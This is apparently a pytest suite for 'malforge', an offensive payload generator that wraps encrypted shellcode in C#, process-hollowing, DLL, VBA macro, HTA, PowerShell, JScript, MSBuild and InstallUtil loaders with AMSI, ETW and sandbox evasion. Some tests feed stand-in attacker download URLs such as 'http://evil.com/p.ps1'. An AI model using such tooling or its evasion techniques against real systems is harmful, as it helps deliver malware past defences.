import os
import pytest
from malforge.crypt import chain
from malforge.emit import render, FORMATS
from malforge.forge import COMPAT


SAMPLE = os.urandom(256)


def test_cs_runner_renders():
    enc, meta = chain(SAMPLE, ['xor'])
    out = render('exe', enc, meta)
    assert 'VirtualAlloc' in out
    assert '0x' in out  # shellcode bytes present
    assert '__' not in out  # no unfilled placeholders


def test_cs_runner_with_amsi():
    enc, meta = chain(SAMPLE, ['xor'])
    out = render('exe', enc, meta, amsi=True)
    assert 'AmsiSc' in out or 'LoadLibrary' in out


def test_cs_runner_with_sandbox():
    enc, meta = chain(SAMPLE, ['xor'])
    out = render('exe', enc, meta, sandbox=True)
    assert 'Sleep' in out
    assert 'DateTime' in out or 'Subtract' in out


def test_cs_runner_aes():
    enc, meta = chain(SAMPLE, ['aes'])
    out = render('exe', enc, meta)
    assert 'Cryptography' in out
    assert 'CreateDecryptor' in out


def test_cs_runner_chain():
    enc, meta = chain(SAMPLE, ['xor', 'aes'])
    out = render('exe', enc, meta)
    assert '_mf_s0' in out  # intermediate variable from chaining


def test_vba_macro_renders():
    enc, meta = chain(SAMPLE, ['xor'])
    out = render('macro', enc, meta)
    assert 'AutoOpen' in out
    assert 'VirtualAlloc' in out
    assert 'Array(' in out


def test_vba_macro_no_encryption():
    enc, meta = chain(SAMPLE, [])
    out = render('macro', enc, meta)
    assert 'buf = Array(' in out  # should rename enc -> buf


def test_hta_renders():
    enc, meta = chain(SAMPLE, ['caesar'])
    out = render('hta', enc, meta)
    assert '<html>' in out
    assert 'Window_OnLoad' in out


def test_ps1_renders():
    enc, meta = chain(SAMPLE, ['xor'])
    out = render('ps1', enc, meta)
    assert 'Add-Type' in out
    assert '$buf' in out or '$enc' in out


def test_jscript_renders():
    out = render('js', b'', [{'method': 'none', 'out_len': 0}],
                 payload_url='http://10.0.0.1/shell.ps1')
    assert 'http://10.0.0.1/shell.ps1' in out
    assert 'WScript.Shell' in out


def test_msbuild_renders():
    enc, meta = chain(SAMPLE, ['xor'])
    out = render('msbuild', enc, meta)
    assert 'CodeTaskFactory' in out
    assert 'MSBuild' in out or 'UsingTask' in out


def test_installutil_renders():
    enc, meta = chain(SAMPLE, ['xor'])
    out = render('installutil', enc, meta)
    assert 'RunInstaller' in out
    assert 'Uninstall' in out


def test_incompatible_format_encryption():
    """VBA + AES should raise an error."""
    enc, meta = chain(SAMPLE, ['aes'])
    with pytest.raises((ValueError, KeyError)):
        render('macro', enc, meta)


def test_all_formats_have_templates():
    """Every format in FORMATS should have a template file that exists."""
    from pathlib import Path
    tmpl_dir = Path(__file__).parent.parent / 'malforge' / 'templates'
    for name, (tmpl_file, lang) in FORMATS.items():
        assert (tmpl_dir / tmpl_file).exists(), f'missing template: {tmpl_file}'


# ---------------------------------------------------------------------------
# Every format x every supported encryption method
# ---------------------------------------------------------------------------

def _render_combo(fmt, methods):
    enc, meta = chain(SAMPLE, methods)
    out = render(fmt, enc, meta)
    assert '__' not in out, f'unfilled placeholder in {fmt} with {methods}'
    return out


class TestAllFormatEncryptionCombos:
    """Render every valid format+encryption combination, check no unfilled placeholders."""

    def test_exe_xor(self):
        _render_combo('exe', ['xor'])

    def test_exe_aes(self):
        _render_combo('exe', ['aes'])

    def test_exe_rc4(self):
        _render_combo('exe', ['rc4'])

    def test_exe_caesar(self):
        _render_combo('exe', ['caesar'])

    def test_exe_none(self):
        _render_combo('exe', [])

    def test_hollow_xor(self):
        _render_combo('hollow', ['xor'])

    def test_hollow_aes(self):
        _render_combo('hollow', ['aes'])

    def test_hollow_rc4(self):
        _render_combo('hollow', ['rc4'])

    def test_hollow_caesar(self):
        _render_combo('hollow', ['caesar'])

    def test_hollow_none(self):
        _render_combo('hollow', [])

    def test_dll_xor(self):
        _render_combo('dll', ['xor'])

    def test_dll_aes(self):
        _render_combo('dll', ['aes'])

    def test_dll_rc4(self):
        _render_combo('dll', ['rc4'])

    def test_dll_caesar(self):
        _render_combo('dll', ['caesar'])

    def test_dll_none(self):
        _render_combo('dll', [])

    def test_macro_xor(self):
        _render_combo('macro', ['xor'])

    def test_macro_caesar(self):
        _render_combo('macro', ['caesar'])

    def test_macro_none(self):
        _render_combo('macro', [])

    def test_hta_xor(self):
        _render_combo('hta', ['xor'])

    def test_hta_caesar(self):
        _render_combo('hta', ['caesar'])

    def test_hta_none(self):
        _render_combo('hta', [])

    def test_ps1_xor(self):
        _render_combo('ps1', ['xor'])

    def test_ps1_aes(self):
        _render_combo('ps1', ['aes'])

    def test_ps1_rc4(self):
        _render_combo('ps1', ['rc4'])

    def test_ps1_caesar(self):
        _render_combo('ps1', ['caesar'])

    def test_ps1_none(self):
        _render_combo('ps1', [])

    def test_msbuild_xor(self):
        _render_combo('msbuild', ['xor'])

    def test_msbuild_aes(self):
        _render_combo('msbuild', ['aes'])

    def test_msbuild_rc4(self):
        _render_combo('msbuild', ['rc4'])

    def test_msbuild_caesar(self):
        _render_combo('msbuild', ['caesar'])

    def test_msbuild_none(self):
        _render_combo('msbuild', [])

    def test_installutil_xor(self):
        _render_combo('installutil', ['xor'])

    def test_installutil_aes(self):
        _render_combo('installutil', ['aes'])

    def test_installutil_rc4(self):
        _render_combo('installutil', ['rc4'])

    def test_installutil_caesar(self):
        _render_combo('installutil', ['caesar'])

    def test_installutil_none(self):
        _render_combo('installutil', [])


class TestChaining:
    def test_xor_xor(self):
        out = _render_combo('exe', ['xor', 'xor'])
        assert '_mfk0' in out and '_mfk1' in out

    def test_aes_aes(self):
        out = _render_combo('exe', ['aes', 'aes'])
        assert 'CreateDecryptor' in out

    def test_rc4_rc4(self):
        out = _render_combo('exe', ['rc4', 'rc4'])
        assert '_mfS0' in out and '_mfS1' in out

    def test_caesar_caesar(self):
        _render_combo('exe', ['caesar', 'caesar'])

    def test_triple_chain(self):
        out = _render_combo('exe', ['xor', 'aes', 'rc4'])
        assert '_mf_s' in out

    def test_all_four(self):
        out = _render_combo('exe', ['xor', 'aes', 'rc4', 'caesar'])
        assert '_mf_s' in out

    def test_vba_xor_caesar_chain(self):
        _render_combo('macro', ['xor', 'caesar'])

    def test_vba_caesar_xor_chain(self):
        _render_combo('macro', ['caesar', 'xor'])

    def test_ps1_triple(self):
        _render_combo('ps1', ['xor', 'aes', 'rc4'])

    def test_ps1_xor_xor(self):
        out = _render_combo('ps1', ['xor', 'xor'])
        assert '_mfk0' in out and '_mfk1' in out


class TestEvasion:
    def test_exe_amsi(self):
        enc, meta = chain(SAMPLE, ['xor'])
        out = render('exe', enc, meta, amsi=True)
        assert 'LoadLibrary' in out
        assert 'AmsiSc' in out or 'am' in out

    def test_exe_etw(self):
        enc, meta = chain(SAMPLE, ['xor'])
        out = render('exe', enc, meta, etw=True)
        assert 'EtwEvent' in out or 'Etw' in out

    def test_exe_sandbox(self):
        enc, meta = chain(SAMPLE, ['xor'])
        out = render('exe', enc, meta, sandbox=True)
        assert 'Sleep' in out

    def test_exe_all_evasion(self):
        enc, meta = chain(SAMPLE, ['xor'])
        out = render('exe', enc, meta, amsi=True, etw=True, sandbox=True)
        assert 'LoadLibrary' in out
        assert 'Etw' in out
        assert 'Sleep' in out

    def test_ps1_amsi(self):
        enc, meta = chain(SAMPLE, ['xor'])
        out = render('ps1', enc, meta, amsi=True)
        assert 'amsi' in out.lower() or 'AmsiUtils' in out

    def test_ps1_etw(self):
        enc, meta = chain(SAMPLE, ['xor'])
        out = render('ps1', enc, meta, etw=True)
        assert 'Etw' in out

    def test_ps1_all_evasion(self):
        enc, meta = chain(SAMPLE, ['xor'])
        out = render('ps1', enc, meta, amsi=True, etw=True)
        assert 'amsi' in out.lower() or 'Amsi' in out
        assert 'Etw' in out

    def test_vba_amsi(self):
        enc, meta = chain(SAMPLE, ['xor'])
        out = render('macro', enc, meta, amsi=True)
        assert 'LoadLibrary' in out

    def test_vba_sandbox(self):
        enc, meta = chain(SAMPLE, ['xor'])
        out = render('macro', enc, meta, sandbox=True)
        assert 'Timer' in out

    def test_msbuild_amsi_etw(self):
        enc, meta = chain(SAMPLE, ['xor'])
        out = render('msbuild', enc, meta, amsi=True, etw=True)
        assert 'LoadLibrary' in out
        assert 'Etw' in out

    def test_installutil_amsi_etw_sandbox(self):
        enc, meta = chain(SAMPLE, ['xor'])
        out = render('installutil', enc, meta, amsi=True, etw=True, sandbox=True)
        assert 'LoadLibrary' in out
        assert 'Etw' in out
        assert 'Sleep' in out

    def test_hollow_all_evasion(self):
        enc, meta = chain(SAMPLE, ['xor'])
        out = render('hollow', enc, meta, amsi=True, etw=True, sandbox=True)
        assert 'LoadLibrary' in out
        assert 'Etw' in out
        assert 'Sleep' in out

    def test_dll_all_evasion(self):
        enc, meta = chain(SAMPLE, ['xor'])
        out = render('dll', enc, meta, amsi=True, etw=True, sandbox=True)
        assert 'LoadLibrary' in out


class TestPs1Template:
    def test_ps1_has_virtualprotect(self):
        enc, meta = chain(SAMPLE, ['xor'])
        out = render('ps1', enc, meta)
        assert 'VirtualProtect' in out

    def test_ps1_no_rwx(self):
        enc, meta = chain(SAMPLE, ['xor'])
        out = render('ps1', enc, meta)
        assert '0x04' in out  # PAGE_READWRITE
        assert '0x20' in out  # PAGE_EXECUTE_READ

    def test_ps1_no_encryption_uses_buf(self):
        enc, meta = chain(SAMPLE, [])
        out = render('ps1', enc, meta)
        assert '$buf' in out
        assert '$enc' not in out


class TestEdgeCases:
    def test_single_byte_shellcode(self):
        enc, meta = chain(b'\xcc', ['xor'])
        out = render('exe', enc, meta)
        assert '0x' in out

    def test_large_shellcode(self):
        big = os.urandom(4096)
        enc, meta = chain(big, ['xor'])
        out = render('exe', enc, meta)
        assert '0x' in out

    def test_jscript_default_url(self):
        out = render('js', b'', [{'method': 'none', 'out_len': 0}])
        assert 'ATTACKER' in out

    def test_jscript_custom_url(self):
        out = render('js', b'', [{'method': 'none', 'out_len': 0}],
                     payload_url='http://evil.com/p.ps1')
        assert 'http://evil.com/p.ps1' in out

    def test_unknown_format_raises(self):
        with pytest.raises(ValueError):
            render('nonexistent', b'', [{'method': 'none', 'out_len': 0}])

    def test_no_encryption_all_cs_formats(self):
        for fmt in ('exe', 'hollow', 'dll', 'msbuild', 'installutil'):
            enc, meta = chain(SAMPLE, [])
            out = render(fmt, enc, meta)
            assert 'byte[] buf =' in out, f'{fmt} should rename enc->buf with no encryption'

    def test_aes_crypto_using_present(self):
        enc, meta = chain(SAMPLE, ['aes'])
        out = render('exe', enc, meta)
        assert 'using System.Security.Cryptography;' in out

    def test_msbuild_aes_using(self):
        enc, meta = chain(SAMPLE, ['aes'])
        out = render('msbuild', enc, meta)
        assert 'System.Security.Cryptography' in out

    def test_randomized_namespace_class(self):
        enc, meta = chain(SAMPLE, ['xor'])
        out1 = render('exe', enc, meta)
        out2 = render('exe', enc, meta)
        # namespace and class names should be randomized -- different each render
        # extract namespace line
        ns1 = [l for l in out1.split('\n') if 'namespace' in l]
        ns2 = [l for l in out2.split('\n') if 'namespace' in l]
        assert ns1 != ns2
